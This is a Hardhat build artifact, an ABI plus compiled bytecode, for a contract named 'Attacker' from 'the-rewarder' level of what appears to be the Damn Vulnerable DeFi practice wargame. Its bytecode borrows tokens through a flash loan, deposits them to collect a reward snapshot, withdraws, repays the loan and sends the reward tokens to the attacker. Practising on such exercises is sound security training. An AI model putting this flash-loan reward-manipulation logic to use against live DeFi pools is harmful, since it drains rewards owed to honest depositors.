{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attacker",
  "sourceName": "contracts/the-rewarder/Attacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "liquidityTokenAddress",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_flashLoanPool",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_rewardPool",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_rewardToken",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_attacker",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "accountingToken",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "flashLoanPool",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "liquidityToken",
      "outputs": [
        {
          "internalType": "contract DamnValuableToken",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "receiveFlashLoan",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "rewardPool",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "rewardToken",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x60a06040523480156200001157600080fd5b5060405162000e2738038062000e27833981810160405281019062000037919062000193565b8473ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1660601b81525050836000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555082600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050505050506200026e565b6000815190506200018d8162000254565b92915050565b600080600080600060a08688031215620001b257620001b16200024f565b5b6000620001c2888289016200017c565b9550506020620001d5888289016200017c565b9450506040620001e8888289016200017c565b9350506060620001fb888289016200017c565b92505060806200020e888289016200017c565b9150509295509295909350565b600062000228826200022f565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b6200025f816200021b565b81146200026b57600080fd5b50565b60805160601c610b8c6200029b60003960008181610152015281816101b401526104410152610b8c6000f3fe608060405234801561001057600080fd5b506004361061007d5760003560e01c806366666aa91161005b57806366666aa9146100d8578063b1099daf146100f6578063da68cf8b14610114578063f7c618c1146101325761007d565b806343cd8f7e146100825780634fd9cb81146100a057806364dd891a146100bc575b600080fd5b61008a610150565b60405161009791906109ed565b60405180910390f35b6100ba60048036038101906100b591906108e9565b610174565b005b6100d660048036038101906100d191906108e9565b610692565b005b6100e0610725565b6040516100ed91906109a9565b60405180910390f35b6100fe61074b565b60405161010b91906109a9565b60405180910390f35b61011c61076f565b60405161012991906109a9565b60405180910390f35b61013a610795565b60405161014791906109a9565b60405180910390f35b7f000000000000000000000000000000000000000000000000000000000000000081565b6101b26040518060400160405280601881526020017f696e207265636965766520666c6173686c6f616e2a2a2a2000000000000000008152506107bb565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836040518363ffffffff1660e01b815260040161022f9291906109c4565b602060405180830381600087803b15801561024957600080fd5b505af115801561025d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061028191906108bc565b50600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b6b55f25826040518263ffffffff1660e01b81526004016102dd9190610a2a565b600060405180830381600087803b1580156102f757600080fd5b505af115801561030b573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636f4a2cd06040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561037957600080fd5b505af115801561038d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103b19190610916565b50600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d826040518263ffffffff1660e01b815260040161040d9190610a2a565b600060405180830381600087803b15801561042757600080fd5b505af115801561043b573d6000803e3d6000fd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836040518363ffffffff1660e01b81526004016104ba9291906109c4565b602060405180830381600087803b1580156104d457600080fd5b505af11580156104e8573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061050c91906108bc565b506000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161056a91906109a9565b60206040518083038186803b15801561058257600080fd5b505afa158015610596573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105ba9190610916565b9050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836040518363ffffffff1660e01b815260040161063b9291906109c4565b602060405180830381600087803b15801561065557600080fd5b505af1158015610669573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061068d91906108bc565b505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639ab603b962989680836040518363ffffffff1660e01b81526004016106ef9190610a2a565b600060405180830381600088803b15801561070957600080fd5b5087f115801561071d573d6000803e3d6000fd5b505050505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b610851816040516024016107cf9190610a08565b6040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050610854565b50565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b60008151905061088c81610b28565b92915050565b6000813590506108a181610b3f565b92915050565b6000815190506108b681610b3f565b92915050565b6000602082840312156108d2576108d1610b12565b5b60006108e08482850161087d565b91505092915050565b6000602082840312156108ff576108fe610b12565b5b600061090d84828501610892565b91505092915050565b60006020828403121561092c5761092b610b12565b5b600061093a848285016108a7565b91505092915050565b61094c81610a61565b82525050565b61095b81610aa9565b82525050565b600061096c82610a45565b6109768185610a50565b9350610986818560208601610adf565b61098f81610b17565b840191505092915050565b6109a381610a9f565b82525050565b60006020820190506109be6000830184610943565b92915050565b60006040820190506109d96000830185610943565b6109e6602083018461099a565b9392505050565b6000602082019050610a026000830184610952565b92915050565b60006020820190508181036000830152610a228184610961565b905092915050565b6000602082019050610a3f600083018461099a565b92915050565b600081519050919050565b600082825260208201905092915050565b6000610a6c82610a7f565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b6000610ab482610abb565b9050919050565b6000610ac682610acd565b9050919050565b6000610ad882610a7f565b9050919050565b60005b83811015610afd578082015181840152602081019050610ae2565b83811115610b0c576000848401525b50505050565b600080fd5b6000601f19601f8301169050919050565b610b3181610a73565b8114610b3c57600080fd5b50565b610b4881610a9f565b8114610b5357600080fd5b5056fea264697066735822122098e92843d56977473fb847f6321fbf69d583d84fb64898c1c7390066215f5bb864736f6c63430008070033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}